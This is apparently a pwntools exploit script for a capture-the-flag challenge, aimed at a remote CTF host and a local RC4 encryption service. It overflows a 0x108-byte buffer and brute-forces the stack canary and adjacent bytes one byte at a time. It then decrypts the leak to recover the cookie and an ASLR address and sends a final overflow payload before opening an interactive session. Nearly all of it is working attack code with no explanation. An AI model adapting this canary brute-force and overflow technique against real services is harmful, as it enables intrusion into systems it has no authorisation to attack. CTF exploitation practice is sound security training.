#!/usr/bin/env python3
from pwn import *
from arc4 import ARC4

REMOTE = False
# REMOTE = True

key = b"mykey6"  # doesn't matter
rc4 = ARC4(key)

if REMOTE:
    stack_cookie_data = b""
else:
    stack_cookie_data = p64(0x3285288226105300)

while len(stack_cookie_data) < 8:
    for i in range(1, 256):
        print(i, stack_cookie_data)
        if REMOTE:
            r = remote("pwn.chal.ctf.gdgalgiers.com", 1401)
        else:
            r = remote("127.0.0.1", 1338)
        r.sendlineafter(b"implementation", b"2")
        r.sendafter(b"Key", key)
        r.sendafter(b"Data", b"a" * 0x108 + stack_cookie_data + p8(i))
        if len(r.recvall()) > 256:
            print("Got loads of data")
            stack_cookie_data += p8(i)
            r.close()
            break
        r.close()


stack_cookie_data += b""

while len(stack_cookie_data) < 40:
    for i in range(1, 256):
        print(i, stack_cookie_data)
        if REMOTE:
            r = remote("pwn.chal.ctf.gdgalgiers.com", 1401)
        else:
            r = remote("127.0.0.1", 1338)
        r.sendlineafter(b"implementation", b"2")
        r.sendafter(b"Key", key)
        r.sendafter(b"Data", b"a" * 0x108 + stack_cookie_data + p8(i))
        if len(r.recvall(timeout=2)) > 256:
            print("Got loads of data")
            stack_cookie_data += p8(i)
            r.close()
            break
        r.close()

print(stack_cookie_data)
rc4 = ARC4(key)
leaked_data = rc4.decrypt(b"a" * 0x108 + stack_cookie_data)[0x108:]
print(hexdump(leaked_data))  # extract cookie [:8], and aslr [-8:]
r = remote("127.0.0.1", 1338)
r.sendlineafter(b"implementation", b"2")
r.sendafter(b"Key", b"a" * 0x108 + p64(0x3285288226105300) + b"A" * 100)
r.sendafter(b"Data", b"a" * 0x108 + p64(0x3285288226105300) + b"A" * 100)
r.interactive()
